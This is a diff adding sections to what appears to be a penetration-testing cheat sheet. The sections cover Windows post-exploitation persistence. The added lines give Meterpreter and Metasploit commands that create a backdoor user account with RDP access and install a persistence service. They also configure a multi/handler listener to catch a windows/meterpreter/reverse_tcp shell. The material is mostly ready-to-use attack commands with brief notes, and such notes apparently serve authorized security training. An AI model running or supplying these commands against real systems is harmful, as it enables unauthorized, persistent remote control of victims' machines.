@@ -315,6 +315,32 @@ meterpreter > download C:\\Temp\\jaws-enum.txt
 ```
 - https://github.com/411Hall/JAWS
 
+## Windows Persistence Via RDP
+```
+meterpreter > run getgui -e -u <username> -p <password>
+
+xfreerdp /u:<username> /p:<password> /v:<ip>
+```
+- Creates a backdoor user account.
+- Password must meet complexity requirements.
+
+## Windows Persistence Via Services
+```
+use exploit/windows/local/persistence_service
+set SESSION <session_id>
+set LPORT <port>
+```
+- Admin or system privileges required.
+- Change `LPORT` if necessary.
+- Retries every 5 seconds.
+
+```
+use multi/handler
+set payload windows/meterpreter/reverse_tcp
+set LHOST <ip>
+set LPORT <port>
+```
+
 ## Working Directories
 - Windows: `C:\Temp`
 - Linux: `/tmp`
